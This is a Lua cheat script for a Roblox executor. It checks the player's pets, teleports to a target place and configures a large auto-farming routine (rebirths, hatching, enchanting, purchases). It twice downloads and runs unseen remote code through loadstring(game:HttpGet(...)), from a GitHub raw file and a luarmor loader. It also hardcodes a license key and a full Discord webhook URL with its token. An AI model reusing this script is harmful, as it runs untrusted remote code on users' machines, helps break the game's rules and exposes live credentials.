-- ===== CONFIG =====
local TARGET_PLACE = 95383978784657
local PET_CHECK_TIME = 10
local GAME_CHECK_TIME = 5
local TELEPORT_TIME = 5

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local LP = Players.LocalPlayer
local Replication = require(RS.Game.Replication)

-- ===== GLOBAL PET CONFIG =====
getgenv().PetConfig = {
    ["Fortunate Calico"] = true,
    ["SUPER Luckyblock"] = true,
    ["JACKPOT"] = true,
    ["5M Frost Monarch"] = true,
    ["5M North Star"] = true,
    ["Frosty Snowman"] = true,
    ["Frost Queen"] = true
}

-- ===== WAIT FOR GAME TO LOAD =====
if not game:IsLoaded() then
    game.Loaded:Wait()
end

-- ===== PET CHECK FUNCTION =====
local function hasConfiguredPet()
    for _, pet in pairs(Replication.Data.Pets or {}) do
        local name = pet.Nickname or pet.Name
        if getgenv().PetConfig[name] then
            return true
        end
    end
    return false
end

-- ===== PET CHECK LOOP =====
local petFound = false
local petStart = tick()
while tick() - petStart < PET_CHECK_TIME do
    if hasConfiguredPet() then
        petFound = true
        break
    end
    task.wait(0.5)
end

-- ===== GAME LOAD FUNCTION =====
local function tryLoad()
    if game.PlaceId == TARGET_PLACE then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/malikstt/script/main/aa"))()
        return true
    end
    return false
end

-- ===== GAME CHECK LOOP =====
local gameCheckStart = tick()
while tick() - gameCheckStart < GAME_CHECK_TIME do
    if tryLoad() then return end
    task.wait(1)
end

-- ===== TELEPORT LOOP =====
local teleportStart = tick()
while tick() - teleportStart < TELEPORT_TIME do
    if tryLoad() then return end
    pcall(function()
        TeleportService:Teleport(TARGET_PLACE, LP)
    end)
    task.wait(1)
end

-- ===== TAP SIM START =====
if not petFound and game.PlaceId ~= TARGET_PLACE then
    script_key = "SiLlPxglopaKOOSKsNJwsrbCnyMTcqtM"
    setfpscap(5)

    -- ===== TAP SIM CONFIG =====
    getgenv().tapSimConfig = {
        CRAFT_EASY_KEY = true,
        CRAFT_HARD_KEY = true,
        OPEN_GALAXY_LUCKY_BLOCK = true,
        FIND_ALL_BLOCK_ESSENCE = true,
        CREATE_LUCKY_BLOCK = { "Starry Lucky Block", "Totem Lucky Block", "Lucky Block" },
        USE_LUCKY_BLOCK = { "Starry Lucky Block", "Totem Lucky Block", "Lucky Block" },
        STABLE_HATCH = false,
        BUY_SECRET_STARTER_PLAZA_PACK = false,
        AUTO_UPDATE_RESTART = true,
        AUTO_EQUIP_BEST = true,
        ADD_FRIEND = false,
        MAX_REBIRTH = math.huge,
        REBIRTH_DELAY = 30000,
        REDEEM_CODE = { "russo", "lucky", "tacos", "enchant", "HTH" },
        OPEN_EGG = { "Lucky Event" },
        FOCUS_EVENT_HATCH = false,
        UNLOCK_WORLD_1_BEST_EGG = false,
        UNLOCK_WORLD_2_BEST_EGG = false,
        BUY_GAMEPASS = { "x8Egg", "FasterEgg", "+4Equip", "+2Equip" },
        BUY_AUTO_CLICKER = true,
        OPEN_ALL_GIFT = true,
        BUY_GEM_SHOP = { RebirthButtons = 34, ClickMultiplier = 20, HatchSpeed = 5, GoldenLuck = 6, CriticalChance = 5 },
        ENCHANT_EQUIPPED_ONLY = true,
        AUTO_ENCHANT = {
            ["Secret I"] = { "Secret Hunter" },
            ["Secret II"] = { "Secret Hunter" },
            ["Secret III"] = { "Secret Hunter" },
            ["Secret X"] = { "Secret Hunter" },
        },
        FALLBACK_3_SECRET_HUNTER_ENCHANT = {
            ["Secret I"] = { "Rainbow Hunter" },
            ["Secret II"] = { "Rainbow Hunter" },
            ["Secret III"] = { "Rainbow Hunter" },
            ["Secret X"] = { "Rainbow Hunter" },
        },
        AUTO_DELETE_EGG_PET = {
            ["Lucky Event"] = { "Lucky Fairy", "Blue Luckyblock", "Yellow Luckyblock", "Lucky Angel", "Jack IN the Box" }
        },
        KEEP_PET_NAME = {},
        KEEP_PET_RARITY = { "Secret I", "Secret II", "Secret III", "Secret X" },
        GOLDEN_PET = {
            ["Lucky Fairy"] = 6,
            ["Blue Luckyblock"] = 6,
            ["Yellow Luckyblock"] = 6,
            ["Lucky Angel"] = 6,
            ["Jack IN the Box"] = 6,
            ["Frost Queen"] = 6,
            ["Prismatic Luckyblock"] = 6,
            ["Surge Dragon"] = 6,
            ["Dual Shock"] = 6,
            ["Overcharged Robot"] = 6
        },
        RAINBOW_PET = { ["Prismatic Luckyblock"] = 5 },
        ELECTRIC_PET = { ["Prismatic Luckyblock"] = true },
        USE_ALL_POTIONS = true,
        USE_TOTEM = { "TotemOfClicks", "TotemOfHatchSpeed", "TotemOfLuck", "TotemOfRebirths", "TotemOfSecretLuck" },
        WEBHOOK_PET_RARITY = { "Secret I", "Secret II", "Secret III", "Secret X" },
        WEBHOOK_URL = "https://discord.com/api/webhooks/1464443545908936877/71UZGdoGptFb3MOp7CMApN7Zayw43gaW4hRmqaEoEreDqcMMSFFtkUdlmnxBsZkV6DL2",
        DISCORD_ID = "",
        SHOW_PUBLIC_DISCORD_ID = true,
        SHOW_WEBHOOK_USERNAME = true,
        SHOW_WEBHOOK_JOBID = true,
        TRADE_PET_NAME = {},
        TRADE_PET_RARITY = {},
        TRADE_USERNAME = {},
        KICK_IF_NO_TRADE_PET = false,
        AUTO_ACCEPT_TRADE = false,
    }

    -- ===== LOAD TAP SIM =====
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/ffab66f7d96a48c13b12e526b19b37d4.lua"))()
    return  -- nothing runs after this
end
